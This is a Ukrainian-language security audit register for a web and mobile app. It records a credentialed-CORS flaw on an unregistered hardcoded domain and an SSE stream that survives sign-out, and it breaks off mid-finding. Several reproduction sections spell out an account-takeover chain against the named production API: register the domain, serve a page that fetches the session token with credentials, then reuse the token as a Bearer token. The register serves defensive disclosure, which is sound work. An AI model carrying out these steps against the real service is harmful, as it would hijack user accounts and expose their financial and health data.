# Аудит 2026-10-01 · Безпека та доступ

> **Status:** Active. Тематичний розділ повного аудиту застосунку: 98 відкритих знахідок. Загальний опис, метод і обмеження — у [README](./README.md).
> **Last validated:** 2026-10-02
> **Next review:** 2026-11-02
> **Spec-lint:** skip. Реєстр знахідок аудиту, не специфікація реалізації.

Знахідки впорядковано за серйозністю, далі за вердиктом. Виправив — зміни рядок «Стан» на `виправлено в #<PR>` або `не відтворюється на <коміт>`, ID не чіпай.

| Серйозність | К-сть |
| ----------- | ----- |
| critical    | 3     |
| high        | 5     |
| medium      | 16    |
| low         | 51    |
| info        | 23    |

## critical

### [critical] Прод-API дає credentialed CORS домену sergeant.2dmanager.com.ua, а 2dmanager.com.ua вільний для реєстрації: шлях до викрадення сесії

- **ID:** `client-static/landing-shell-mobile#1` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Статика клієнта та інфри
- **Стан:** відкрито
- **Де:** apps/server/src/http/cors.ts:23-27 (PROD_ORIGINS, рядок 25); той самий хост також у apps/mobile-shell/src/index.ts:172, apps/mobile-shell/android/app/src/main/AndroidManifest.xml:66, apps/mobile/app.config.ts:69, apps/mobile/src/lib/deepLinks.ts:34, apps/web/src/core/observability/deployEnvironment.ts:52, apps/web/public/.well-known/security.txt:5; cookie SameSite=None: apps/server/src/auth.ts:69-83
- **Вплив:** Будь-хто може зареєструвати 2dmanager.com.ua. Тоді сторінка на sergeant.2dmanager.com.ua прочитає /api/auth/get-session залогіненого відвідувача разом із session.token і використає його як Bearer до 7 днів (rolling). Це повне захоплення акаунта: фінанси, здоровʼя, AI-чат, експорт, видалення даних. Також доступні будь-які мутації /api/v1/*, бо X-Requested-With дозволений у preflight для цього origin.
- **Що зробити:** Негайно прибрати https://sergeant.2dmanager.com.ua з PROD_ORIGINS (cors.ts) і перевірити ALLOWED_ORIGINS/ALLOWED_ORIGIN_REGEX у Coolify. Прибрати хост із DEEP_LINK_HTTPS_HOSTS, AndroidManifest, app.config.ts, deepLinks.ts, deployEnvironment.ts і security.txt. Варто викупити 2dmanager.com.ua, щоб домен не перехопили. Додати CI-перевірку, що кожен hardcoded prod-origin резолвиться і належить проєкту. Розглянути SameSite=Lax: app.sergeant.com.ua і api.sergeant.com.ua є same-site.

**Докази:**

```text
Живий прод (GET/OPTIONS з Origin):
`OPTIONS https://api.sergeant.com.ua/api/v1/me Origin: https://sergeant.2dmanager.com.ua -> 200 ACAO=https://sergeant.2dmanager.com.ua ACAC=true`
`GET /api/auth/get-session (той самий Origin) -> 200 ACAO=https://sergeant.2dmanager.com.ua ACAC=true`
Контроль: `Origin: https://evil.example.com -> ACAO=undefined`.
DNS: `2dmanager.com.ua A/NS ENOTFOUND`. WHOIS hostmaster.ua для 2dmanager.com.ua: «ДОМЕННЕ ІМ'Я ВІЛЬНЕ … Доменне ім'я доступне для реєстрації».
Локально: `GET /api/auth/get-session` (userA) повертає `session.token`, і `Authorization: Bearer <token>` без cookie дає `GET /api/v1/me -> 200` (bearer() plugin). У проді за `https` BETTER_AUTH_URL cookie сесії `sameSite: "none", secure: true` (auth.ts:76-82), коментар у cors.ts:31-34 це підтверджує.
```

**Відтворення:**

```text
1) node <scratch>/agents/client-static-landing-shell-mobile/cors-probe.mjs https://api.sergeant.com.ua/api/auth/get-session https://sergeant.2dmanager.com.ua https://evil.example.com. 2) node .../dns.mjs 2dmanager.com.ua; node .../whois.mjs 'https://www.hostmaster.ua/whois/?_domain=2dmanager.com.ua'. 3) node .../getsession.mjs (локально: token із get-session працює як Bearer). Атака: зареєструвати 2dmanager.com.ua, підняти https://sergeant.2dmanager.com.ua зі скриптом fetch('https://api.sergeant.com.ua/api/auth/get-session',{credentials:'include'}), заманити залогіненого користувача (Chrome, сторонні cookie за замовчуванням дозволені).
```

**Верифікатор:**

```text
Повторив незалежно 2026-10-02 близько 02:00 UTC. Прод-API віддає credentialed CORS для https://sergeant.2dmanager.com.ua: на /api/auth/get-session і OPTIONS, і GET повертають ACAO=<origin> та ACAC=true, а контрольний evil.example.com отримує ACAO=undefined. Origin захардкоджено в PROD_ORIGINS (apps/server/src/http/cors.ts:25), тож він активний і при NODE_ENV=production. Домен справді вільний. DNS у пісочниці працює (google.com і sergeant.com.ua резолвляться), а 2dmanager.com.ua, sergeant.* і www.* дають ENOTFOUND. WHOIS hostmaster.ua для 2dmanager.com.ua пише «ДОМЕННЕ ІМ'Я ВІЛЬНЕ … доступне для реєстрації»; контрольний sergeant.com.ua показує «ЗАРЕЄСТРОВАНЕ». Локально get-session повертає session.token, і `Authorization: Bearer <token>` без cookie дає /api/v1/me -> 200 (плагін bearer() у auth.ts:617). Шукав, що могло б це нейтралізувати, і не знайшов: у сервері немає перевірок Sec-Fetch-Site; cookie не Partitioned і без domain-скоупу; customSession чи хука, що вирізав би token із get-session, немає. За https BETTER_AUTH_URL cookie ставиться з SameSite=None; Secure (auth.ts:69-83), і це документовано в ADR-0017 та railway-vercel.md. Обмеження: атака працює в браузерах, які пропускають сторонні cookie за замовчуванням (Chrome/Edge, десктоп і Android), а в Safari (ITP) і Firefox (TCP) ні. Для захоплення акаунта досить, щоб жертва відкрила сторінку, тому лишаю critical.
```

**Додаткові докази верифікатора:**

```text
Додаткові наслідки того самого вільного домену. apps/web/public/.well-known/security.txt оголошує `Canonical: https://sergeant.2dmanager.com.ua/.well-known/security.txt`, а docs/governance/security/beta-tester-brief.md:8 радить бета-тестерам слати вразливості через security.txt саме на цьому домені. Хто зареєструє домен, зможе перехоплювати звіти про вразливості. Хост також у DEFAULT_CANONICAL_HOSTS (deployEnvironment.ts:52), і їхню синхронізацію з PROD_ORIGINS стереже scripts/check-canonical-hosts.mjs, тож прибирати треба з обох списків одночасно. Скрипти: <scratch>/agents/verify-client-static-landing-shell-mobile/{cors-probe,dns,whois,getsession}.mjs.
```

**Скептик:** не спростував, оцінка critical.

```text
I tried to refute this and could not. I re-ran every step myself; scripts are in <scratch>/agents/skeptic-client-static-landing-shell-mobile-1/.

1. **The origin is allowed on prod with credentials.** `apps/server/src/http/cors.ts:23-27` hardcodes `https://sergeant.2dmanager.com.ua` in `PROD_ORIGINS` at line 25. `getAllowedOrigins()` (cors.ts:57-67) uses that list even when `NODE_ENV=production`, and `setCorsHeaders` (cors.ts:129-133) reflects the origin with `ACAC: true`.
   - Live probe (probe.mjs) against `api.sergeant.com.ua`: `/api/auth/get-session`, `/api/v1/me` and `/api/me` all return `ACAO=https://sergeant.2dmanager.com.ua` and `ACAC=true`, for both OPTIONS and GET.
   - The preflight allows GET/POST/PUT/PATCH/DELETE.
   - Controls: `evil.example.com` and `localhost:5173` get no ACAO.

2. **The domain really is unregistered.**
   - DNS: `2dmanager.com.ua` and `sergeant.2dmanager.com.ua` return ENOTFOUND for A, AAAA, NS and SOA. The same resolver resolves `com.ua` NS, `sergeant.com.ua` and `api.sergeant.com.ua`.
   - RDAP (rdap.hostmaster.ua, the server IANA lists for .ua): 404 for 2dmanager.com.ua, 200 for the control sergeant.com.ua.
   - WHOIS at hostmaster.ua: «ДОМЕННЕ ІМ'Я ВІЛЬНЕ … доступне для реєстрації». The control sergeant.com.ua shows «ЗАРЕЄСТРОВАНЕ».
   - Anyone can register under .com.ua. The repo has been public since 2026-09-30 (AGENTS.md), so anyone can also see the stale origin.

3. **I checked the main thing that could have refuted it: whether the prod cookie actually travels cross-site.**
   - Front and API share a site (`app.` and `api.sergeant.com.ua`), so prod could have set `BETTER_AUTH_CROSS_SITE_COOKIES=0`. If it had, the cookie would be Lax and the attack would fail.
   - `apps/web/vercel.json` has no `/api` rewrite, and CSP `connect-src` points at `https://api.sergeant.com.ua`. So the cookie is host-only on the API.
   - I sent one no-op `POST /api/auth/sign-out` to prod with no cookie (signout.mjs). better-auth sign-out calls `deleteSessionCookie`, which echoes the real attributes. Nothing is deleted, because there is no session.
   - Result: `__Secure-better-auth.session_token=…; Path=/; HttpOnly; Secure; SameSite=None`. No `Partitioned`, no `Domain`. This matches `auth.ts:69-83`.
   - Chrome and Edge send this cookie on a credentialed cross-site fetch while third-party cookies are on, which is still the default in normal (non-incognito) mode.

4. **Nothing else in the code path blocks it.**
   - No server code checks Sec-Fetch-* (grep finds nothing in `apps/server/src`).
   - `requireCsrfHeader` only requires `X-Requested-With`, which relies on the preflight. This origin passes the preflight, so mutations also get through.
   - better-auth `trustedOrigins` covers only POSTs on `/api/auth` and does not apply to GET get-session.
   - auth.ts has no `customSession` and no hook that strips the token.

5. **A stolen token works as a Bearer token.** Locally (gs.mjs), `get-session` returns `session.token`, and `Authorization: Bearer <token>` with no cookie gives `/api/v1/me` → 200. This goes through `bearer()` (auth.ts:617). Sessions last 7 days and roll (auth.ts:425-426), so the attacker keeps access.

**Severity.** The limits are real: the victim must be logged in, use Chrome or Edge with default settings, and visit the attacker's page. Safari (ITP) and Firefox (TCP) block the cookie. These limits narrow who can be hit but do not change the outcome. A one-time cheap domain registration plus one visit gives full account takeover: reading financial and health data, any mutation, and a persistent Bearer token. That is critical under the brief's rubric, so I keep the claimed severity.

**Secondary impact (confirmed).** `apps/web/public/.well-known/security.txt:5` and `docs/governance/security/beta-tester-brief.md:8` send vulnerability reports to this domain. Whoever registers it could intercept those reports.

**Fix note.** The host must be removed from `PROD_ORIGINS` and from `DEFAULT_CANONICAL_HOSTS` (`apps/web/src/core/observability/deployEnvironment.ts:52`) together, because `scripts/check-canonical-hosts.mjs` checks that the two lists match. The deep-link and Android manifest entries should be removed as well. Registering the domain defensively would also close the hole.
```

### [critical] Credentialed CORS видає довіру домену sergeant.2dmanager.com.ua, апекс якого не резолвиться (NXDOMAIN, схоже, вільний для реєстрації). Наслідок: читання всіх даних і крадіжка сесії

- **ID:** `server-static-redo/route-authz#1` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика сервера · повтор route-authz
- **Стан:** відкрито
- **Де:** apps/server/src/http/cors.ts:23-27 (PROD_ORIGINS, рядок 25), cors.ts:62-66 (список діє і в production), cors.ts:129-133 (ACAO=origin + ACAC=true); apps/server/src/http/apiCors.ts:169-194; ті самі мертві хости в apps/mobile/app.config.ts:69, apps/mobile-shell/src/index.ts:172, apps/web/src/core/observability/deployEnvironment.ts:52, docs/governance/security/beta-tester-brief.md:8 (security.txt)
- **Вплив:** Хто зареєструє 2dmanager.com.ua і підніме на ньому sergeant.2dmanager.com.ua, отримує credentialed-доступ до прод-API від імені кожного залогіненого відвідувача. Для цього потрібен Chrome, де сторонні SameSite=None-куки дозволені за замовчуванням. Атакувальник читає /api/me/export, /api/v2/sync/pull, фінанси, змінює дані (sync push, disconnect банків, billing cancel) і забирає session token з get-session/list-sessions. Токен працює як Bearer, тобто це повне захоплення акаунта. Той самий домен лишився довіреним хостом deep link/universal links у мобільних застосунках, а в доках його вказано як адресу security.txt для звітів про вразливості.
- **Що зробити:** Негайно прибрати https://sergeant.2dmanager.com.ua з PROD_ORIGINS (і з UNIVERSAL_LINK_HOSTS, DEEP_LINK_HTTPS_HOSTS, DEFAULT_CANONICAL_HOSTS, посилання на security.txt) або повернути контроль над доменом (зареєструвати його). Перевірити WHOIS. Перестати хардкодити прод-origin-и в коді: один список з env, спільний для CORS і Better Auth trustedOrigins. Для не-auth записів додати серверну перевірку Origin, а не покладатися лише на CORS+XRW.

**Докази:**

```text
DNS (node dns, 2026-10-02): 2dmanager.com.ua A/NS/SOA → ENOTFOUND; sergeant.2dmanager.com.ua → ENOTFOUND; app.sergeant.com.ua і sergeant.vercel.app резолвляться. Перевірено на локальному API з Origin: https://sergeant.2dmanager.com.ua: OPTIONS /api/me/preferences → 200, ACAO=https://sergeant.2dmanager.com.ua, ACAC=true, X-Requested-With дозволено. GET /api/me, /api/me/preferences з кукою userA → 200 з ACAO та ACAC. GET /api/auth/get-session → 200 з ACAO, у тілі є session.token; GET /api/auth/list-sessions → масив, де в кожного елемента є token. Цей токен як `Authorization: Bearer` без куки дає GET /api/me → 200 email=audit_a@example.com (probe3.out). PATCH /api/me/preferences з цього Origin з XRW → 200. Better Auth сам відхиляє POST /api/auth/update-user з цього Origin (403 INVALID_ORIGIN), бо його trustedOrigins формується окремо (auth.ts:654-700). Решта /api/* для запису спирається лише на CORS+XRW.
```

**Відтворення:**

```text
node <scratch>/agents/server-static-redo-route-authz/probe2.mjs і probe3.mjs (локальний стек), dns.mjs для DNS. Кроки експлуатації навмисно не розписано.
```

**Верифікатор:**

```text
Підтверджено в коді і живим запитом. cors.ts:23-27: PROD_ORIGINS містить https://sergeant.2dmanager.com.ua. getAllowedOrigins() (62-66) повертає PROD_ORIGINS і при NODE_ENV=production, тобто в проді хост довірений безумовно, незалежно від env. setCorsHeaders (129-133) віддає ACAO=origin і ACAC=true. apiCorsMiddleware ставиться на весь /api, включно з /api/auth/*. Єдиний серверний захист записів, requireCsrfHeader, перевіряє лише X-Requested-With, а preflight з цього origin XRW дозволяє. Перевірки Origin поза Better Auth немає. У проді кука SameSite=None; Secure (auth.ts:69-84: getAdvancedCookieOptions для https BETTER_AUTH_URL). Веб ходить на api.sergeant.com.ua напряму (CSP connect-src у apps/web/vercel.json, Vercel не проксіює), тож credentialed cross-site fetch з цього домену несе сесійну куку. Домен вільний для реєстрації, це перевірено трьома незалежними способами (див. extraEvidence). Знайти, що це нейтралізує, не вдалося. Better Auth trustedOrigins цього хоста не містить, тому блокується лише POST /api/auth/update-user (403 INVALID_ORIGIN). Але GET get-session/list-sessions (сирі токени), /api/me/export і всі не-auth записи (/api/*) проходять. Нижчу severity не ставлю: для повного захоплення акаунта досить зареєструвати вільний .com.ua і отримати TLS-сертифікат. Обмеження: потрібен браузер, що шле сторонні SameSite=None-куки (Chrome за замовчуванням).
```

**Додаткові докази верифікатора:**

```text
Скрипти: <scratch>/agents/verify-server-static-redo-route-authz/{dns.mjs,rdap.mjs,v1.mjs}. DNS: системний резолвер дає ENOTFOUND для 2dmanager.com.ua (A/NS/SOA), а google.com.ua резолвиться. Google DoH (dns.google) для 2dmanager.com.ua NS повертає Status 3 (NXDOMAIN) з SOA зони com.ua, тобто домен не делеговано на рівні реєстру. RDAP https://rdap.hostmaster.ua/domain/2dmanager.com.ua → 404 (для sergeant.com.ua → 200). WHOIS hostmaster.ua: «ДОМЕННЕ ІМ'Я ВІЛЬНЕ… Доменне ім'я доступне для реєстрації». Живий прогін на свіжому pool-користувачі: OPTIONS /api/v2/sync/push з Origin sergeant.2dmanager.com.ua → 200, ACAO=origin, ACAC=true, methods включно з DELETE. Для evil.example ACAO немає. GET /api/me/export, /api/auth/get-session, /api/auth/list-sessions → 200 з ACAO/ACAC і повними даними. Токен з list-sessions як Bearer без куки → GET /api/me 200. PATCH /api/me/preferences з цього Origin з XRW → 200 з ACAO. POST /api/auth/update-user (JSON) → 403 INVALID_ORIGIN. Той самий хост є в apps/web/public/.well-known/security.txt (Canonical), docs/governance/security/beta-tester-brief.md:8, UNIVERSAL_LINK_HOSTS (apps/mobile/app.config.ts:69), AndroidManifest mobile-shell:66, DEFAULT_CANONICAL_HOSTS (deployEnvironment.ts:52). Синхронність цих списків стереже scripts/check-canonical-hosts.mjs, тож прибирати хост треба з усіх місць одночасно. Попередній аудит security-comprehensive-2026-08-04.md §1.2 закрив лише localhost-origin-и, а цей хост пропустив.
```

**Скептик:** не спростував, оцінка critical.

```text
Спроба спростування не вдалася. Кожну ланку я перевірив сам, незалежно від двох попередніх агентів.

1) Код. apps/server/src/http/cors.ts:23-27: PROD_ORIGINS безумовно містить "https://sergeant.2dmanager.com.ua". cors.ts:62-65: у production defaults = PROD_ORIGINS (без DEV), тобто хост довірений і в проді, а ALLOWED_ORIGINS / ALLOWED_ORIGIN_REGEX можуть лише додати origin, не прибрати. cors.ts:129-132 віддає ACAO=<origin> і ACAC=true. apps/server/src/app.ts:151 ставить apiCorsMiddleware на весь /api, а requireCsrfHeader (app.ts:167) перевіряє лише X-Requested-With, який цей origin дозволяє в preflight (apiCors.ts:30-31). Окремої перевірки Origin / Sec-Fetch-Site поза Better Auth немає. grep по apps/server/src знайшов лише cors.ts і trustedOrigins у auth.ts. CORP на CORS-mode fetch не діє.

2) Кука в проді. auth.ts:69-84: getAdvancedCookieOptions дає SameSite=None; Secure, коли BETTER_AUTH_URL має https. env.ts:805-828 вимагає https у production, тож це шлях за замовчуванням. Атрибута Partitioned немає. Вимкнути це може лише BETTER_AUTH_CROSS_SITE_COOKIES=0, але за документацією (env-vars.md:41, railway-vercel.md:35) дефолт саме None, і прод-оріджин sergeant.vercel.app є крос-сайтовим, тож None там потрібен.

3) Токен. auth.ts:617: bearer() без requireSignature, тобто сирий session.token з get-session / list-sessions працює як Bearer.

4) Живий повтор (<scratch>/agents/skeptic-server-static-redo-route-authz-1/live.mjs). OPTIONS /api/me/preferences з Origin https://sergeant.2dmanager.com.ua: 200, ACAO=origin, ACAC=true, methods включно з PATCH/DELETE, X-Requested-With дозволено. GET /api/auth/get-session з кукою userA: 200, ACAO+ACAC, у тілі є session.token. GET /api/me: 200 з ACAO+ACAC. Контроль https://evil.example: ACAO/ACAC відсутні.

5) Домен (dns.mjs, rdap.mjs у тій самій теці). Системний резолвер: 2dmanager.com.ua A/NS/SOA = ENOTFOUND, sergeant.com.ua і google.com.ua резолвляться. Google DoH і Cloudflare DoH: Status 3 (NXDOMAIN) з SOA зони com.ua, тобто домен не делеговано в реєстрі. RDAP rdap.hostmaster.ua/domain/2dmanager.com.ua = 404, а для sergeant.com.ua = 200. com.ua відкритий для реєстрації будь-ким. До того ж хост відкрито опубліковано в публічному репо (cors.ts) і в security.txt (apps/web/public/.well-known/security.txt: Canonical), тож знайти його легко.

Чим severity могла б бути нижчою, і чому це не спрацьовує:
(а) Потрібна взаємодія жертви: залогінений користувач має відкрити сторінку атакувальника.
(б) Працює лише в браузерах, що шлють сторонні SameSite=None-куки: Chrome/Edge/Opera за замовчуванням (Google у 2025 відмовився від вимкнення 3PC). Safari ITP, Firefox TCP і Brave атаку блокують.
(в) Теоретично в проді могли виставити BETTER_AUTH_CROSS_SITE_COOKIES=0. З репо це не видно, і це суперечить задокументованому дефолту.
(г) Атакувальник мусить зареєструвати домен і отримати TLS (кілька доларів плюс Let's Encrypt).
Жодна з умов не залежить від компрометації третьої сторони, а наслідок — повне захоплення акаунта будь-якого відвідувача з Chrome: читання експорту, sync і фінансів, запис через /api/* з XRW, крадіжка сесійного токена, що працює як Bearer. За шкалою брифу (account takeover = critical) лишаю critical. За CVSS через UI:R вийшло б High (~8.1), тож на нижній межі це high, але не нижче.

Додатково варто перевірити, що sergeant.vercel.app (теж у PROD_ORIGINS) справді належить власнику: глобальний простір імен *.vercel.app має той самий клас ризику. Фікс один: прибрати хост з PROD_ORIGINS і з усіх синхронізованих списків (UNIVERSAL_LINK_HOSTS, DEFAULT_CANONICAL_HOSTS, security.txt, mobile-shell AndroidManifest, check-canonical-hosts test). Як захист на майбутнє: щонайменше вимагати, щоб будь-який хост з цих списків резолвився, або викупити домен.
```

### [critical] Захардкоджений credentialed-CORS origin `sergeant.2dmanager.com.ua` стоїть на ВІЛЬНОМУ для реєстрації домені — крадіжка сесії й захоплення акаунта

- **ID:** `server-static/gap-blocked-input-route-findings#1` · **Вердикт:** підтверджено · **Категорія:** `authz` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Де:** apps/server/src/http/cors.ts:23-27 (PROD_ORIGINS); дубльовано: apps/web/src/core/observability/deployEnvironment.ts:52, apps/mobile-shell/src/index.ts:172, apps/mobile/src/lib/deepLinks.ts:34, apps/web/public/.well-known/security.txt:6
- **Вплив:** Повне захоплення акаунта будь-якого залогіненого користувача, що відкрив підконтрольну атакеру сторінку: крадеться токен сесії (придатний як Bearer) і весь персональний експорт (фінанси, здоров'я, профіль). Домен не контролюється власником і доступний для реєстрації будь-ким — бар'єр до експлуатації нульовий.
- **Що зробити:** Негайно прибрати `https://sergeant.2dmanager.com.ua` з PROD_ORIGINS (cors.ts) і з усіх дзеркал (deployEnvironment.ts, mobile-shell, mobile deepLinks, security.txt, applinks). Якщо домен ще потрібен — зареєструвати його на власника до повернення у список. Додати гейт check-canonical-hosts, що валить білд, якщо прод-origin не резолвиться у Vercel/власну інфру. Розглянути скорочення get-session, щоб не повертати raw token у відповідь, читану cross-site.

**Докази:**

```text
PROD_ORIGINS = ["https://sergeant.vercel.app", "https://sergeant.2dmanager.com.ua", "https://app.sergeant.com.ua"]. setCorsHeaders() (cors.ts:129-132) на будь-який origin зі списку віддає Access-Control-Allow-Origin: <origin> + Access-Control-Allow-Credentials: true. DNS: node:dns resolve для sergeant.2dmanager.com.ua та 2dmanager.com.ua → ENOTFOUND; dns.google (DoH) → Status 3 (NXDOMAIN) з SOA зони com.ua; WHOIS hostmaster.ua для 2dmanager.com.ua буквально: «Доменне ім'я доступне для реєстрації» (ВІЛЬНИЙ). Інші два origin-и vercel/app.sergeant.com.ua резолвляться у Vercel і віддають справжній застосунок. У проді cookie сесії SameSite=None; Secure (auth.ts:54,80 getAdvancedCookieOptions). Жива перевірка з origin=https://sergeant.2dmanager.com.ua проти локального API: GET /api/me → 200 ACAO=origin ACAC=true; GET /api/auth/get-session → 200, тіло містить session.token (raw); GET /api/me/export → 200 (повний експорт). Цей host при цьому НЕ входить у getTrustedOrigins() (auth.ts:654), тож Better Auth origin-check його не покриває, але credentialed GET-читання від нього CORS дозволяє.
```

**Відтворення:**

```text
1) Зареєструвати вільний домен 2dmanager.com.ua і піддомен sergeant.2dmanager.com.ua за валідним https. 2) Розмістити сторінку, що з credentials:'include' робить fetch('https://<prod-api>/api/auth/get-session') і fetch('/api/me/export'). 3) Залогінена жертва відкриває сторінку → браузер чіпляє SameSite=None cookie, сервер повертає ACAO=origin+ACAC=true, JS читає session.token і повний експорт. Токен далі вживається як Authorization: Bearer (bearer-плагін). Локально підтверджено скриптами dns.mjs/doh.mjs/whois.mjs/cors.mjs/gs.mjs.
```

**Верифікатор:**

```text
Відтворено повністю, і в коді, і наживо. cors.ts:23-27 тримає `https://sergeant.2dmanager.com.ua` у PROD_ORIGINS, тобто в проді він теж є. setCorsHeaders (cors.ts:129-132) відповідає на нього ACAO=origin і ACAC=true. Домен ніхто не контролює: dns.resolve дає ENOTFOUND для 2dmanager.com.ua, sergeant.2dmanager.com.ua і www, а dns.google і cloudflare-dns обидва повертають NXDOMAIN із SOA зони com.ua. WHOIS hostmaster.ua для 2dmanager.com.ua: «ДОМЕННЕ ІМ'Я ВІЛЬНЕ … доступне для реєстрації». Для порівняння, sergeant.com.ua зареєстровано 2026-08-27 з NS на vercel-dns, тобто це домен власника. У проді API на api.sergeant.com.ua (167.233.98.92), а BETTER_AUTH_URL там https, тож getAdvancedCookieOptions ставить SameSite=None; Secure, і cookie їде в cross-site credentialed fetch. Нейтралізатора не знайшов. Better Auth originCheck (getTrustedOrigins) покриває лише POST /api/auth/*, GET його не стосується. Глобальний CSRF-гейт знімається, бо preflight від цього origin проходить і X-Requested-With дозволено. Обмеження експлуатації: потрібен браузер, що шле third-party SameSite=None cookie, тобто Chrome або Edge за замовчуванням. Safari ITP такі cookie блокує, Firefox TCP їх партиціонує. Цього достатньо для critical, бо ціна атаки дорівнює реєстрації домену.
```

**Додаткові докази верифікатора:**

```text
Мій прогін verify-.../cors.mjs з origin https://sergeant.2dmanager.com.ua: GET /api/auth/get-session → 200, ACAO=https://sergeant.2dmanager.com.ua, ACAC=true, у session є ключі expiresAt,token,…, token типу string. GET /api/me → 200 з ACAO. GET /api/me/export → 200 з ACAO, ключі generatedAt,user,preferences,data. Контроль з https://evil.example: ACAO (none). Вкрадений session.token як `Authorization: Bearer` на /api/me → 200 (bearer-плагін), отже це повне захоплення. Preflight PATCH /api/me/preferences з 2dmanager → 200 з ACAO, далі PATCH з X-Requested-With → 200, тобто відкриті й записи. Скрипти: dns.mjs, doh.mjs, whois.mjs, apidns.mjs. Хост лежить і в apps/web/public/.well-known/security.txt (Canonical), AndroidManifest, deepLinks. scripts/__tests__/check-canonical-hosts.test.mjs вважає його прод-origin-ом. У docs/work/specs/audits і docs/open-work.md згадок про те, що домен вільний, немає.
```

**Скептик:** не спростував, оцінка critical.

```text
I tried to refute this from several directions and could not. Each link in the chain checks out, and prod confirms the server-side reflection.

1) The origin really is in prod, and env cannot remove it. cors.ts:23-27 puts https://sergeant.2dmanager.com.ua in PROD_ORIGINS. getAllowedOrigins() (cors.ts:62-66) uses PROD_ORIGINS in both modes. ALLOWED_ORIGINS and ALLOWED_ORIGIN_REGEX can only add origins (cors.ts:57-66, 99-104). setCorsHeaders (cors.ts:129-132) reflects ACAO=origin with ACAC=true. It is mounted globally on /api before any route (app.ts:149-151, apiCors.ts:43-55), so it also covers the Better Auth mount at routes/auth.ts:33. The repo itself locks the host in: scripts/__tests__/check-canonical-hosts.test.mjs:32,41 and the `lint:canonical-hosts` gate (env-vars.md:474). apps/mobile-shell/src/index.ts:163 calls it the «попередній кастомний домен», so it is a leftover, not a live property.

2) Prod check. I sent one unauthenticated OPTIONS to https://api.sergeant.com.ua/api/me (script prod-preflight.mjs). With Origin https://sergeant.2dmanager.com.ua it returned 200, ACAO=https://sergeant.2dmanager.com.ua and ACAC=true. With Origin https://evil.example both headers were null. So the deployed backend reflects this origin with credentials allowed.

3) Nobody owns the domain. I checked this myself:
- node dns: ENOTFOUND on all record types for 2dmanager.com.ua, sergeant.2dmanager.com.ua and www.
- dns.google and cloudflare-dns: Status 3 (NXDOMAIN), with SOA from the com.ua zone.
- hostmaster.ua WHOIS: «ДОМЕННЕ ІМ'Я ВІЛЬНЕ … Доменне ім'я доступне для реєстрації».
- Control: sergeant.com.ua is registered 2026-08-27 with NS on vercel-dns.
.com.ua registration is open to anyone, so the barrier is a cheap registration plus a Let's Encrypt cert.

4) Cookie mode. getAdvancedCookieOptions (auth.ts:69-84) sets SameSite=None; Secure whenever BETTER_AUTH_URL is https. Only BETTER_AUTH_CROSS_SITE_COOKIES=0 turns that off. I found no evidence prod sets it, and sergeant.vercel.app, still listed as a prod front, is cross-site to api.sergeant.com.ua and needs None to work at all. The cookie has no Partitioned/CHIPS attribute (no match in apps/server/src). The 2026-08-04 security audit (security-comprehensive-2026-08-04.md:98-101) already states prod cookies are sameSite:none. That audit rated the same pattern for localhost origins as a real chain, and it was fixed.

5) No neutralizer.
- requireCsrfHeader skips GET/HEAD/OPTIONS and /api/auth/*.
- Better Auth trustedOrigins (auth.ts:654) only gates state-changing auth calls.
- Nothing checks Sec-Fetch-Site.
- Writes are open too: preflight from this origin returns 200 with ACAO, and X-Requested-With is in the allow-list (apiCors.ts:31).

6) Local reproduction with my own throwaway user.
- Server level (hdr.mjs): with this origin, get-session, /api/me and /api/me/export all return 200 with ACAO+ACAC. The session object contains a string `token`. Control evil.example gets no ACAO.
- Bearer reuse: the stolen token sent as `Authorization: Bearer` to /api/me returns 200 (bearer plugin, auth.ts:617).
- Browser level (browser-sim.mjs): Chromium 141 with default settings. I mapped real HTTPS hostnames with --host-resolver-rules: api.sergeant.com.ua goes to a TLS proxy in front of the local API, the attacker page is served on sergeant.2dmanager.com.ua, and the cookie is set exactly as prod does (SameSite=None; Secure; HttpOnly). The page's fetch(credentials:'include') read get-session (tokenStolen:true) and the full /api/me/export. The same page on evil.example was blocked by CORS.
- Sessions last 7 days with updateAge of 1 day (auth.ts:425-426), so a stolen token kept in daily use stays valid until it is revoked.

What limits it, though not enough to downgrade:
- The victim has to visit the attacker page while logged in.
- It needs a browser that sends third-party SameSite=None cookies. Chrome, Edge and Chrome Android do by default. Safari ITP, Firefox Total Cookie Protection and Brave mitigate it.
That is UI:R, roughly CVSS 8.1. But the outcome is cross-user account takeover plus exfiltration of financial and health data, the attacker can get the origin for almost nothing today, and prod confirms the reflection. Under the brief's taxonomy (account takeover = critical), critical stands.

Side effects of whoever owns the domain:
- They control the Canonical security.txt (apps/web/public/.well-known/security.txt:5), which beta-tester-brief.md:8 links to for vulnerability reports.
- They control a host the mobile apps treat as their own deep-link domain.

Scripts are in <scratch>/agents/skeptic-server-static-gap-blocked-input-route-findings-1/ (dns.mjs, web.mjs, hdr.mjs, browser-sim.mjs, prod-preflight.mjs).
```

## high

### [high] SSE-стрім /api/v2/sync/stream переживає sign-out сесії і далі доставляє живі push-и — підсилювач вичерпання ресурсів і витік даних відкликаної сесії

- **ID:** `api-live/gap-sse-concurrent-connection-exhaustion#2` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Живе API
- **Стан:** відкрито
- **Де:** apps/server/src/modules/sync/syncV2Stream.ts:214-216 (сесія резолвиться раз на handshake), :331-348 (opLogEmitter.on по userId, без ре-валідації), :366-411 (cleanup лише на close/aborted сокета); apps/server/src/http/requireSession.ts:126-186 (гейт лише на вході роута)
- **Вплив:** Відкликана (logout з пристрою, logout-all, revoke після зміни пароля) або викрадена сесія НЕ закриває вже відкритий стрім: він безстроково продовжує отримувати живий op-log юзера (фінанси/здоровʼя). Сервер стрім примусово не рубає — лише клієнт або рестарт процесу (у цьому стенді ~2год; у проді — необмежено). Це і витік даних поза межами життя сесії, і головний підсилювач попередньої знахідки: покинуті/ротовані сесії лишають відкриті зʼєднання, які ніхто не закриє, і вони накопичуються до стелі fd.
- **Що зробити:** Періодично ре-валідувати сесію всередині живого стріму (напр. раз на heartbeat через getFreshSessionUser) і закривати res при відкликанні; або публікувати подію revocation у opLogEmitter, що форс-закриває всі стріми відповідного sessionId/userId на logout/ logout-all/зміні пароля. Як мінімум ввести максимальний TTL стріму.

**Докази:**

```text
